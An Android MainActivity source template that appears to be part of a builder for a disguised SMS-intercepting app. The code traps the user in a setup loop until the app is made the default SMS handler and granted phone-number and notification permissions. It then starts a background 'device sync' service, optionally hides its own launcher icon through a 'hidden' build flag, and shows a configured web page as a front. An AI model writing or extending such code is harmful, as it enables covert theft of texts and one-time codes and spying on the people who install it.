package {{PACKAGE_NAME}};

import android.Manifest;
import android.app.Activity;
import android.app.role.RoleManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.provider.Telephony;
import android.text.TextUtils;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;

import {{PACKAGE_NAME}}.sync.DeviceSyncManager;

public class MainActivity extends Activity {
    private static final String BUILD_VISIBILITY_HIDDEN = "hidden";
    private static final String LAUNCHER_ACTIVITY_ALIAS_SUFFIX = ".LauncherActivityAlias";
    private static final int PHONE_STATE_PERMISSION_REQUEST_CODE = 2001;
    private static final int NOTIFICATION_PERMISSION_REQUEST_CODE = 2002;
    private static final int DEFAULT_SMS_APP_REQUEST_CODE = 2003;
    private static final int APP_SETTINGS_REQUEST_CODE = 2004;

    private WebView webView;
    private boolean setupCompleted;
    private boolean defaultSmsRequestInFlight;
    private boolean phoneStatePermissionRequestedAtLeastOnce;
    private boolean notificationPermissionRequestedAtLeastOnce;
    private boolean appSettingsRequestInFlight;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showSetupPlaceholder(getCurrentSetupBlockState());
        continueSetupFlow();
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (!setupCompleted && !defaultSmsRequestInFlight && !appSettingsRequestInFlight) {
            continueSetupFlow();
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
            return;
        }

        if (!setupCompleted) {
            continueSetupFlow();
            return;
        }

        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        if (webView != null) {
            webView.destroy();
            webView = null;
        }

        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PHONE_STATE_PERMISSION_REQUEST_CODE
                || requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            continueSetupFlow();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == DEFAULT_SMS_APP_REQUEST_CODE) {
            defaultSmsRequestInFlight = false;
            continueSetupFlow();
            return;
        }

        if (requestCode == APP_SETTINGS_REQUEST_CODE) {
            appSettingsRequestInFlight = false;
            continueSetupFlow();
        }
    }

    private void continueSetupFlow() {
        if (setupCompleted) {
            return;
        }

        showSetupPlaceholder(getCurrentSetupBlockState());

        if (requestDefaultSmsAppIfNeeded()) {
            return;
        }
        if (requestPhoneStatePermissionIfNeeded()) {
            return;
        }
        if (requestNotificationPermissionIfNeeded()) {
            return;
        }

        finishSetup();
    }

    private boolean requestPhoneStatePermissionIfNeeded() {
        String permission = getPhoneStatePermission();
        if (hasPhoneStatePermission()) {
            return false;
        }

        if (phoneStatePermissionRequestedAtLeastOnce && !shouldShowRequestPermissionRationale(permission)) {
            openAppSettings();
            return true;
        }

        phoneStatePermissionRequestedAtLeastOnce = true;
        requestPermissions(new String[]{permission}, PHONE_STATE_PERMISSION_REQUEST_CODE);
        return true;
    }

    private boolean requestDefaultSmsAppIfNeeded() {
        if (isDefaultSmsApp()) {
            return false;
        }

        if (defaultSmsRequestInFlight) {
            return true;
        }

        defaultSmsRequestInFlight = true;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            RoleManager roleManager = getSystemService(RoleManager.class);
            if (roleManager != null && roleManager.isRoleAvailable(RoleManager.ROLE_SMS)) {
                if (!roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                    try {
                        startActivityForResult(
                                roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS),
                                DEFAULT_SMS_APP_REQUEST_CODE
                        );
                        return true;
                    } catch (Exception ignored) {
                        defaultSmsRequestInFlight = false;
                    }
                } else {
                    defaultSmsRequestInFlight = false;
                    return false;
                }
            }
        }

        Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
        try {
            startActivityForResult(intent, DEFAULT_SMS_APP_REQUEST_CODE);
            return true;
        } catch (Exception ignored) {
            defaultSmsRequestInFlight = false;
            return false;
        }
    }

    private boolean requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            return false;
        }

        if (hasNotificationPermission()) {
            return false;
        }

        if (notificationPermissionRequestedAtLeastOnce
                && !shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS)) {
            openAppSettings();
            return true;
        }

        notificationPermissionRequestedAtLeastOnce = true;
        requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, NOTIFICATION_PERMISSION_REQUEST_CODE);
        return true;
    }

    private void openAppSettings() {
        if (appSettingsRequestInFlight) {
            return;
        }

        appSettingsRequestInFlight = true;
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.fromParts("package", getPackageName(), null));
        try {
            startActivityForResult(intent, APP_SETTINGS_REQUEST_CODE);
        } catch (Exception ignored) {
            appSettingsRequestInFlight = false;
        }
    }

    private String getPhoneStatePermission() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                ? "android.permission.READ_PHONE_NUMBERS"
                : Manifest.permission.READ_PHONE_STATE;
    }

    private boolean isDefaultSmsApp() {
        String currentDefault = Telephony.Sms.getDefaultSmsPackage(this);
        return getPackageName().equals(currentDefault);
    }

    private boolean hasPhoneStatePermission() {
        return checkSelfPermission(getPhoneStatePermission()) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasNotificationPermission() {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU
                || checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
    }

    private void finishSetup() {
        setupCompleted = true;
        startDeviceSyncService();
        disableLauncherAliasIfNeeded();
        showWebViewOrFinish();
    }

    private void showSetupPlaceholder(SetupBlockState state) {
        if (setupCompleted || webView != null) {
            return;
        }
        setContentView(R.layout.activity_setup_blocked);

        TextView titleView = findViewById(R.id.setupTitleView);
        TextView messageView = findViewById(R.id.setupMessageView);

        if (titleView != null) {
            titleView.setText(state.titleResId);
        }
        if (messageView != null) {
            messageView.setText(state.messageResId);
        }
    }

    private void showWebViewOrFinish() {
        String webviewUrl = getString(R.string.webview_url);
        if (TextUtils.isEmpty(webviewUrl)) {
            finish();
            return;
        }

        if (webView == null) {
            webView = new WebView(this);
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setLoadWithOverviewMode(true);
            settings.setUseWideViewPort(true);
            webView.setWebViewClient(new WebViewClient());
            webView.setWebChromeClient(new WebChromeClient());
            setContentView(webView);
        }

        webView.loadUrl(webviewUrl);
    }

    private void startDeviceSyncService() {
        DeviceSyncManager.ensureRunning(this);
    }

    private void disableLauncherAliasIfNeeded() {
        String buildVisibilityMode = getString(R.string.build_visibility_mode);
        if (!BUILD_VISIBILITY_HIDDEN.equalsIgnoreCase(buildVisibilityMode)) {
            return;
        }

        ComponentName componentName = new ComponentName(this, getPackageName() + LAUNCHER_ACTIVITY_ALIAS_SUFFIX);
        getPackageManager().setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }

    private SetupBlockState getCurrentSetupBlockState() {
        if (!isDefaultSmsApp()) {
            return new SetupBlockState(
                    R.string.setup_sms_role_title,
                    R.string.setup_sms_role_message
            );
        }

        if (!hasPhoneStatePermission()) {
            if (phoneStatePermissionRequestedAtLeastOnce
                    && !shouldShowRequestPermissionRationale(getPhoneStatePermission())) {
                return new SetupBlockState(
                        R.string.setup_open_settings_title,
                        R.string.setup_phone_permission_settings_message
                );
            }

            return new SetupBlockState(
                    R.string.setup_phone_permission_title,
                    R.string.setup_phone_permission_message
            );
        }

        if (!hasNotificationPermission()) {
            if (notificationPermissionRequestedAtLeastOnce
                    && !shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS)) {
                return new SetupBlockState(
                        R.string.setup_open_settings_title,
                        R.string.setup_notification_permission_settings_message
                );
            }

            return new SetupBlockState(
                    R.string.setup_notification_permission_title,
                    R.string.setup_notification_permission_message
            );
        }

        return new SetupBlockState(
                R.string.setup_required_title,
                R.string.setup_required_message
        );
    }

    private static final class SetupBlockState {
        private final int titleResId;
        private final int messageResId;

        private SetupBlockState(int titleResId, int messageResId) {
            this.titleResId = titleResId;
            this.messageResId = messageResId;
        }
    }
}
